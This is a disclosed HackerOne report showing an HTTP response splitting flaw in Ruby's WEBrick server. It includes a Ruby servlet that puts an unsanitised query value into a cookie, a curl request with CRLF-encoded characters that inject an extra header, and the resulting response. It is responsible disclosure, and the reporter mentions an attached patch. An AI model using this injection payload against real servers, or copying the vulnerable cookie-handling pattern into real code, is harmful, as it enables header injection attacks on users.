@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/153794
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/tenderlove
+ReportedTo:Ruby(ruby)
+BountyAmount:
+Severity:low
+State:Closed
+DateOfDisclosure:29.04.2018 2:01:36
+
+Summary:
+
+Hi,
+
+WEBrick seems to be vulnerable to a [response splitting attack](https://www.owasp.org/index.php/HTTP_Response_Splitting).  The reproduction script is very similar to the code shown on the owasp page:
+
+```ruby
+require 'webrick'
+
+class MyServlet < ::WEBrick::HTTPServlet::AbstractServlet
+  def service req, res
+    res.cookies << WEBrick::Cookie.new('author', req.query['author'])
+    res.body = 'hello world'
+  end
+end
+
+server = ::WEBrick::HTTPServer.new Port: 8080
+server.mount "/", MyServlet
+trap('INT') { server.shutdown }
+server.start
+```
+
+From the command line do:
+
+```
+$ curl -i localhost:8080/?author=Aaron%0D%0AX-Foo:%20hacked
+```
+
+The response looks like this:
+
+```
+HTTP/1.1 200 OK 
+Server: WEBrick/1.3.1 (Ruby/2.4.0/2016-07-12)
+Date: Mon, 25 Jul 2016 19:13:18 GMT
+Content-Length: 11
+Connection: Keep-Alive
+Set-Cookie: author=Aaron
+X-Foo: hacked
+
+hello world
+```
+
+You can see the header has been injected.  I've attached a patch to fix the issue.
+
+Note:  It seems like many Ruby webservers are vulnerable to this attack.  So we may need to coordinate release.
